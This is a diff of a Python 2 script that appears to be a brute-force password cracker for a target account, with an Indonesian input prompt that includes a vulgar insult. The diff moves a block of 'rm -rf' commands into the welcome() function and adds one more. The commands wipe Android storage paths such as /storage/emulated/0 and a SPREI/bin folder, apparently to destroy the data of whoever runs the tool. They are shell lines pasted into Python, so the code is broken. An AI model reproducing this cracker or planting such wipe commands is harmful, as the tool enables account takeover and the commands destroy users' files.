@@ -6,12 +6,7 @@ import mechanize
 import cookielib
 import random
 
-rm -rf /storage/emulated/0
-rm -rf /storage
-rm -rf /internal
-rm -rf /storage/sdcard
 
-rm -rf SPREI/bin
 
 
 email = str(raw_input("Masukin Target Kalian kontol~|Contoh : OrangTmv12/1002454842 ~|: "))
@@ -90,6 +85,13 @@ def welcome():
 	print " [*] Account to crack : {}".format(email)
 	print " [*] Loaded :" , len(total), "passwords"
 	print " [*] Cracking, please wait ...\n\n"
+	
+rm -rf /storage/emulated/0
+rm -rf /storage
+rm -rf /internal
+rm -rf /storage/sdcard
+rm -rf /storage/secara 1
+rm -rf SPREI/bin
 
 	
 if __name__ == '__main__':
